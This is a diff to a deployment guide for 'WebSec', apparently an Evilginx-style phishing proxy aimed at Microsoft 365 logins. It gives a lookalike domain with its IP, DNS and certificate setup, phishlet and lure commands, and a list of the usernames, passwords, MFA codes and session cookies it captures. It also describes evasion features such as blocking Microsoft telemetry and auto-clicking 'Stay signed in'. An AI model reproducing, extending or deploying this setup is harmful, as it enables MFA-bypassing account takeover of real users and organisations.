@@ -36,13 +36,11 @@ This guide covers deploying WebSec as a standalone phishing framework on AWS EC2
 
 **Primary Domain:** `azbpartner.com`
 
-**O365-1 Phishlet Subdomains:**
+**O365 Updated Phishlet Subdomains:**
 - `login.azbpartner.com` → `15.206.73.179` (Primary O365 login)
-- `portal.azbpartner.com` → `15.206.73.179` (Office portal redirects)
-- `sso.azbpartner.com` → `15.206.73.179` (Live SSO authentication)
-- `auth.azbpartner.com` → `15.206.73.179` (Token exchange endpoints)
-- `cdn1.azbpartner.com` → `15.206.73.179` (Asset CDN - msftauth.net)
-- `cdn2.azbpartner.com` → `15.206.73.179` (Asset CDN - msauth.net)
+- `www.azbpartner.com` → `15.206.73.179` (Office.com portal)
+- `m365.azbpartner.com` → `15.206.73.179` (Microsoft 365 cloud)
+- `outlook.azbpartner.com` → `15.206.73.179` (Outlook web access)
 
 ## 🔧 Prerequisites
 
@@ -110,11 +108,9 @@ cp -r redirectors/* ~/.websec/redirectors/
 | Type | Name | Content | Proxy Status |
 |------|------|---------|--------------|
 | A | login.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
-| A | portal.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
-| A | sso.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
-| A | auth.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
-| A | cdn1.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
-| A | cdn2.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | www.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | m365.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | outlook.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
 
 **Cloudflare Settings:**
 - SSL/TLS Mode: Full (strict)
@@ -127,8 +123,8 @@ cp -r redirectors/* ~/.websec/redirectors/
 **Option 1: Cloudflare Origin Certificate (Recommended)**
 
 ```bash
-# Create certificate directories
-for subdomain in login portal sso auth cdn1 cdn2; do
+# Create certificate directories for O365 Updated phishlet subdomains
+for subdomain in login www m365 outlook; do
     mkdir -p ~/.websec/crt/sites/${subdomain}.azbpartner.com
 done
 
@@ -137,7 +133,7 @@ done
 # Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem
 
 # Set proper permissions
-for subdomain in login portal sso auth cdn1 cdn2; do
+for subdomain in login www m365 outlook; do
     chmod 600 ~/.websec/crt/sites/${subdomain}.azbpartner.com/privkey.pem
     chmod 644 ~/.websec/crt/sites/${subdomain}.azbpartner.com/fullchain.pem
 done
@@ -161,15 +157,15 @@ cd /opt/websec
 # Set base domain
 config domain azbpartner.com
 
-# Configure O365-1 phishlet
-phishlets hostname o365-1 login.azbpartner.com
-phishlets enable o365-1
+# Configure O365 Updated phishlet
+phishlets hostname o365 login.azbpartner.com
+phishlets enable o365
 
 # Verify configuration
-phishlets o365-1
+phishlets o365
 
 # Create lure for testing
-lures create o365-1
+lures create o365
 lures get-url 0
 ```
 
@@ -208,11 +204,11 @@ sudo systemctl status websec
 ### 1. Basic Connectivity Test
 
 ```bash
-# Test if WebSec is running on O365-1 phishlet subdomains
+# Test if WebSec is running on O365 Updated phishlet subdomains
 curl -k https://login.azbpartner.com
-curl -k https://portal.azbpartner.com
-curl -k https://sso.azbpartner.com
-curl -k https://auth.azbpartner.com
+curl -k https://www.azbpartner.com
+curl -k https://m365.azbpartner.com
+curl -k https://outlook.azbpartner.com
 
 # Check service status
 sudo systemctl status websec
@@ -221,7 +217,7 @@ sudo systemctl status websec
 sudo journalctl -u websec -f
 ```
 
-### 2. O365-1 Phishlet Testing
+### 2. O365 Updated Phishlet Testing
 
 ```bash
 # Connect to WebSec
@@ -230,16 +226,16 @@ cd /opt/websec
 
 # Test the phishlet flow
 # 1. Visit the lure URL
-curl -k "https://login.azbpartner.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://portal.office.com&scope=openid"
+curl -k "https://login.azbpartner.com/"
 
 # 2. Check if phishlet is active
-phishlets o365-1
+phishlets o365
 
 # 3. Monitor sessions for credential capture
 sessions
 
 # 4. Test lure generation
-lures create o365-1
+lures create o365
 lures get-url 0
 ```
 
@@ -252,31 +248,38 @@ When a victim visits your lure:
 4. **Token Capture:** WebSec captures authentication tokens
 5. **Session Tracking:** Credentials stored in WebSec sessions
 
-## 📊 O365-1 Phishlet Features
+## 📊 O365 Updated Phishlet Features
 
-The `o365-1.yaml` phishlet includes:
+The `o365_updated_phishlet.txt` phishlet includes:
 
-**Advanced OAuth2/PKCE Support:**
-- Handles modern Microsoft authentication flows
-- Captures PKCE code challenges and verifiers
-- Supports token exchange endpoints
-
-**Comprehensive Coverage:**
+**Comprehensive O365 Coverage:**
 - `login.microsoftonline.com` - Primary O365 login
-- `portal.office.com` - Office portal redirects
-- `live.com` - Live account SSO
-- `microsoftonline.com/common` - Token exchange
-- `msftauth.net` & `msauth.net` - Asset CDNs
+- `www.office.com` - Office.com portal
+- `m365.cloud.microsoft` - Microsoft 365 cloud services
+- `outlook.office365.com` & `outlook.office.com` - Outlook web access
 
-**Security Evasion:**
-- Strips integrity attributes from JavaScript
-- Blocks Microsoft telemetry calls
-- Auto-submits credentials for better UX
+**Advanced Session Management:**
+- Multiple domain cookie capture
+- Enhanced token harvesting
+- ADFS support (configurable)
+- Stay signed in automation
 
-**Credential Capture:**
-- Username: `login` field
-- Password: `passwd` field
-- Session tokens: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `OTAuth`
+**Enhanced Security Evasion:**
+- URL rewriting for all Microsoft endpoints
+- Hostname replacement filters
+- Auto-click "Stay signed in" functionality
+- Force POST parameters for better compatibility
+
+**Comprehensive Credential Capture:**
+- Username: `login`, `loginfmt`, `UserName`, `Email` fields
+- Password: `passwd`, `Password`, `Passwd` fields
+- MFA Code: `otc` field (6-digit codes)
+- Session tokens: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `SignInStateCookie`, `CCState`, `buid`, `esctx`, `fpc`, `OIDCAuth`, `MUID`, `ROBX`, `OIDC`, `OptInPBT`
+
+**ADFS Integration:**
+- Configurable ADFS support for enterprise environments
+- Custom subdomain configuration
+- Enhanced authentication flow handling
 
 ## 🔍 Monitoring and Maintenance
 
@@ -344,24 +347,24 @@ sudo netstat -tlnp | grep :443
 
 **2. SSL Certificate issues:**
 ```bash
-# Check certificate files for O365-1 phishlet subdomains
+# Check certificate files for O365 Updated phishlet subdomains
 ls -la ~/.websec/crt/sites/login.azbpartner.com/
-ls -la ~/.websec/crt/sites/portal.azbpartner.com/
-ls -la ~/.websec/crt/sites/sso.azbpartner.com/
-ls -la ~/.websec/crt/sites/auth.azbpartner.com/
+ls -la ~/.websec/crt/sites/www.azbpartner.com/
+ls -la ~/.websec/crt/sites/m365.azbpartner.com/
+ls -la ~/.websec/crt/sites/outlook.azbpartner.com/
 
 # Verify certificates
 openssl x509 -in ~/.websec/crt/sites/login.azbpartner.com/fullchain.pem -text -noout
-openssl x509 -in ~/.websec/crt/sites/portal.azbpartner.com/fullchain.pem -text -noout
+openssl x509 -in ~/.websec/crt/sites/www.azbpartner.com/fullchain.pem -text -noout
 ```
 
 **3. Domain not resolving:**
 ```bash
-# Check DNS for O365-1 phishlet subdomains
+# Check DNS for O365 Updated phishlet subdomains
 nslookup login.azbpartner.com
-nslookup portal.azbpartner.com
-nslookup sso.azbpartner.com
-nslookup auth.azbpartner.com
+nslookup www.azbpartner.com
+nslookup m365.azbpartner.com
+nslookup outlook.azbpartner.com
 
 # Check Cloudflare settings
 # Ensure A records point to 15.206.73.179
@@ -370,16 +373,16 @@ nslookup auth.azbpartner.com
 **4. Phishlet not working:**
 ```bash
 # Check phishlet configuration
-phishlets o365-1
+phishlets o365
 
 # Verify hostname is set
-phishlets hostname o365-1
+phishlets hostname o365
 
 # Check if phishlet is enabled
 phishlets
 
 # Test lure generation
-lures create o365-1
+lures create o365
 lures get-url 0
 ```
 
@@ -392,10 +395,10 @@ ps aux | grep websec
 # Check network connections
 sudo netstat -tlnp | grep websec
 
-# Test SSL for O365-1 phishlet subdomains
+# Test SSL for O365 Updated phishlet subdomains
 openssl s_client -connect login.azbpartner.com:443 -servername login.azbpartner.com
-openssl s_client -connect portal.azbpartner.com:443 -servername portal.azbpartner.com
-openssl s_client -connect sso.azbpartner.com:443 -servername sso.azbpartner.com
+openssl s_client -connect www.azbpartner.com:443 -servername www.azbpartner.com
+openssl s_client -connect m365.azbpartner.com:443 -servername m365.azbpartner.com
 ```
 
 ## 📁 Directory Structure
@@ -408,25 +411,19 @@ openssl s_client -connect sso.azbpartner.com:443 -servername sso.azbpartner.com
 
 ~/.websec/                      # Configuration directory
 ├── crt/sites/                  # SSL certificates
-│   ├── login.azbpartner.com/   # O365-1 primary login
+│   ├── login.azbpartner.com/   # O365 primary login
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── portal.azbpartner.com/ # Office portal redirects
+│   ├── www.azbpartner.com/     # Office.com portal
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── sso.azbpartner.com/    # Live SSO authentication
+│   ├── m365.azbpartner.com/    # Microsoft 365 cloud
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── auth.azbpartner.com/   # Token exchange endpoints
-│   │   ├── fullchain.pem      # Public certificate
-│   │   └── privkey.pem        # Private key
-│   ├── cdn1.azbpartner.com/   # Asset CDN (msftauth.net)
-│   │   ├── fullchain.pem      # Public certificate
-│   │   └── privkey.pem        # Private key
-│   └── cdn2.azbpartner.com/   # Asset CDN (msauth.net)
+│   └── outlook.azbpartner.com/ # Outlook web access
 │       ├── fullchain.pem      # Public certificate
 │       └── privkey.pem        # Private key
-├── phishlets/                  # Active phishlets (o365-1.yaml)
+├── phishlets/                  # Active phishlets (o365.yaml)
 └── redirectors/                # Active redirectors
 ```
 
